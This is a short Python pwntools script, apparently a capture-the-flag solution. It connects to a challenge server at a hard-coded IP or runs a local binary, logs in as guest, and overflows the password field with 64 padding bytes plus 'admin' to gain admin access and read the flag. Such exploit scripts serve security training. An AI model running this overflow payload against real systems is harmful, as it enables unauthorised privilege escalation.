from pwn import *
import sys

try:
    if sys.argv[1] == "remote":
        r = remote("139.180.137.100", 1337)
    else:
        r = process('./pwn')
except:
    print("Usage: python3 pwn-sol.py [remote/local]")
    exit()

r.recvuntil(b"Exit")
r.sendline(b"2")

r.recvuntil(b"username:")
r.sendline(b"guest")

r.recvuntil(b"passwd:")
r.sendline(b'A'*64 + b'admin')

r.recvuntil(b"Exit")
r.sendline(b"4")

r.recv(1024)
flag = r.recv(1024)
if b"ASCIS" in flag:
    print(flag)
else:
    print("[-] Can not find the /home/pwn01/flag")